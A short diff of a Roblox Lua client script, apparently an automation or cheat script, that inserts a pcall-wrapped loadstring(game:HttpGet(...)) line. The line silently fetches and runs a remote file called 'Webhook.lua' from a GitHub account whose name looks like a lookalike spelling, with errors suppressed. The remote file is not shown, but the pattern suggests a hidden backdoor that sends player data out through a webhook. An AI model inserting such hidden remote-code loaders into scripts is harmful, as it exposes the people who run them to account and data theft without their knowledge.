@@ -1,7 +1,9 @@
 local Players = game:GetService("Players")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local TweenService  = game:GetService("TweenService")
-
+pcall(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/StarFIow/Scripts/main/Utility/Webhook.lua"))()
+end)
 local plr = Players.LocalPlayer
 local playerGui = plr:WaitForChild("PlayerGui")
 
